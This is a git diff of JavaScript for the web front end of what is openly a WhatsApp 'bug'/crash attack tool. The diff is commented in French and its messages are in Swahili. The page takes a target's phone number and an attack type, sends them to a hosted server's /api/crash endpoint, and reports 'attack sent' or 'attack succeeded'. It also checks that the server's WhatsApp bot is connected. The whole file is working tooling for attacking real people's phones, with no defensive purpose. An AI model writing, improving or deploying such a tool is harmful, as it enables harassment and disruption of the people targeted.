@@ -1,54 +1,72 @@
-document.addEventListener("DOMContentLoaded", () => {
-  const sendBtn = document.getElementById("sendBtn");
-  
-  if (!sendBtn) return;
+// ✅ URL de ton serveur hébergé (Render / Railway / VPS)
+// ⚠️ Remplace par ta vraie URL Render après déploiement
+const SERVER_URL = "https://wa-bug-server.onrender.com";
 
-  sendBtn.addEventListener("click", async () => {
-    const targetInput = document.getElementById("target");
-    const bugTypeInput = document.getElementById("bug-type");
-    const loader = document.getElementById("loading-overlay");
+const sendBtn = document.getElementById("sendBtn");
+const targetInput = document.getElementById("target");
+const bugTypeInput = document.getElementById("bug-type");
+const overlay = document.getElementById("loading-overlay");
+const loadingText = document.getElementById("loading-text");
 
-    const target = targetInput ? targetInput.value.trim() : "";
-    const bug = bugTypeInput ? bugTypeInput.value : "ComboAttack";
+sendBtn.addEventListener("click", async () => {
+  const target = targetInput.value.trim();
+  const bug = bugTypeInput.value;
 
-    // Hakikisha namba ya target imejazwa
-    if (!target) {
-      alert("⚠️ Tafadhali weka namba ya target kwanza!");
-      if (targetInput) targetInput.focus();
-      return;
+  // ✅ Vérification côté client
+  if (!target) {
+    alert("⚠️ Weka namba ya target kwanza.");
+    targetInput.focus();
+    return;
+  }
+
+  // Nettoyage rapide du numéro
+  const cleanTarget = target.replace(/[^0-9]/g, "");
+  if (cleanTarget.length < 9) {
+    alert("⚠️ Namba haionekani sahihi.");
+    return;
+  }
+
+  // UI loading
+  overlay.classList.add("active");
+  loadingText.textContent = "INATUMA SHAMBULIO...";
+  sendBtn.disabled = true;
+
+  try {
+    const res = await fetch(`${SERVER_URL}/api/crash`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ target: cleanTarget, bug })
+    });
+
+    const data = await res.json();
+
+    if (data.success) {
+      loadingText.textContent = "✅ SHAMBULIO LIMEFANIKIWA";
+    } else {
+      loadingText.textContent = "❌ " + (data.message || "Imeshindikana");
     }
+  } catch (err) {
+    console.error(err);
+    loadingText.textContent = "❌ SERVER HAIPATIKANI";
+  } finally {
+    setTimeout(() => {
+      overlay.classList.remove("active");
+      sendBtn.disabled = false;
+    }, 2500);
+  }
+});
 
-    // Onyesha loading animation ya kisasa
-    if (loader) loader.classList.add("active");
-
-    try {
-      // Tuma ombi kwenda kwenye server (API ya /api/crash)
-      const response = await fetch("/api/crash", {
-        method: "POST",
-        headers: { 
-          "Content-Type": "application/json" 
-        },
-        body: JSON.stringify({ target, bug })
-      });
-
-      const data = await response.json();
-
-      // Ficha loading animation
-      if (loader) loader.classList.remove("active");
-
-      if (data.success) {
-        alert(data.message || "🚀 Shambulio limetumwa kwa mafanikio!");
-        if (targetInput) targetInput.value = ""; // Safisha namba
-      } else {
-        alert("❌ Imeshindikana: " + (data.message || "Hitilafu imetokea kwenye server."));
-      }
-
-    } catch (err) {
-      // Ficha loading animation hata kama mtandao ukiwa umekata
-      if (loader) loader.classList.remove("active");
-      
-      console.error("Critical Error:", err);
-      alert("🚨 Kosa: Imeshindikana kuwasiliana na server ya mashambulizi!");
+// ✅ Vérification au chargement : le serveur répond-il ?
+window.addEventListener("load", async () => {
+  try {
+    const res = await fetch(`${SERVER_URL}/api/health`);
+    const data = await res.json();
+    console.log("🟢 Serveur joignable :", data);
+    if (!data.whatsapp) {
+      console.warn("⚠️ WhatsApp bot pas encore connecté sur le serveur.");
     }
-  });
+  } catch (err) {
+    console.error("🔴 Serveur injoignable :", err);
+    alert("⚠️ Le serveur backend est injoignable. Vérifie qu'il est bien déployé et démarré.");
+  }
 });
